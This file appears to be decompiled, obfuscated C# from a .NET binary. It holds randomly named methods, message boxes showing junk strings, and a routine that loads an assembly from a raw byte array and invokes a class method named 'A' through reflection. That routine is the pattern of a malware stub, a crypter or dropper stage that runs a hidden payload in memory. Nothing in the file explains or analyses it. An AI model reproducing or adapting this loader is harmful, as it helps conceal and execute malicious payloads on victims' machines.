using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Class;

[StandardModule]
internal sealed class aje0oayDp
{
	public static void pRZKT2eH47xbdDHVDE7O48()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("'>u|p8gj…}/^6*ŠYZYR\u008d‹)ghT$F‡-\u0081$& +Š‡,y3T8f(D`J<;W\u007f1'fZ‹ OŽm(c3€€-j5!rS’`U!:u}cgJ0ˆ^>‚R/4");
		Interaction.MsgBox((object)"U7[ƒ\u008d)ˆdn\u008dU*WG]HH.AE†q()vŽ%&rwi/|xeK/\u0081&z†J„u€(N&5…RR!\\XOvmB_\u008f7I5‡BW2c!k7\u007fYR\\\u007fF<m_’ƒ€D6-@?6hT_Z}n!n€^c<U49;fZ)\u008fbPQg’\u0090G[„q47…ML6kEov[0", (MsgBoxStyle)0, (object)null);
	}

	public static object Rm(byte[] AssemblyName)
	{
		Assembly assembly = Assembly.Load(AssemblyName);
		Type[] types = assembly.GetTypes();
		int num = 0;
		Type type;
		object result = default(object);
		while (true)
		{
			if (num < types.Length)
			{
				type = types[num];
				if (type.IsClass && type.FullName!.EndsWith(".A"))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return result;
		}
		object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(type));
		return RuntimeHelpers.GetObjectValue(type.InvokeMember("A", BindingFlags.InvokeMethod, null, RuntimeHelpers.GetObjectValue(objectValue), new object[0]));
	}
}
